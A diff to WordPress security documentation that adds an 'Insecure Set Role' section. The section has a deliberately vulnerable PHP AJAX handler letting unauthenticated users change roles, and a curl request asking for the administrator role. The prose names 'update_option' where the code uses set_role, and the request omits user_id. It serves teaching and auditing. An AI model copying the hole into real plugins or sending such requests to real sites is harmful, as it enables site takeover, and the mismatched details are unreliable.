@@ -6,6 +6,7 @@ head:
 contributors:
     - rafiem
     - bk273
+    - dhakalananda
 ---
 
 import { LinkCard } from '@astrojs/starlight/components';
@@ -348,3 +349,35 @@ curl -X POST "http://yourwordpresssite.com/wp-json/wp/v2/users?user_id=1" \
 Below are some of the findings related to this vulnerable setting:
 
 - [Critical Privilege Escalation in LiteSpeed Cache Plugin Affecting 5+ Million Sites](https://patchstack.com/articles/critical-privilege-escalation-in-litespeed-cache-plugin-affecting-5-million-sites/)
+
+## Insecure Set Role
+
+WordPress provides the `WP_User::set_role()` method to change a user’s role. It’s a legitimate way for an administrator to move a user from one role to another (for example, from “author” to “editor”).
+
+If a plugin exposes this functionality via an AJAX or REST endpoint without strict permission checks, an attacker could abuse it to elevate their privileges.
+
+```php
+add_action( 'wp_ajax_change_user_role', 'myplugin_change_user_role' );
+add_action( 'wp_ajax_nopriv_change_user_role', 'myplugin_change_user_role' );
+
+function myplugin_change_user_role() {
+
+    $user_id = intval( $_POST['user_id'] );
+    $new_role = sanitize_text_field( $_POST['new_role'] );
+
+    $user = get_user_by( 'id', $user_id );
+    if ( ! $user ) {
+        wp_send_json_error( array( 'message' => 'User not found' ), 404 );
+    }
+
+    $user->set_role( $new_role );
+
+    wp_send_json_success( array( 'message' => 'Role changed' ) );
+}
+```
+
+To exploit this, any unauthenticated user needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=change_user_role -d "new_role=administrator"
+``` 
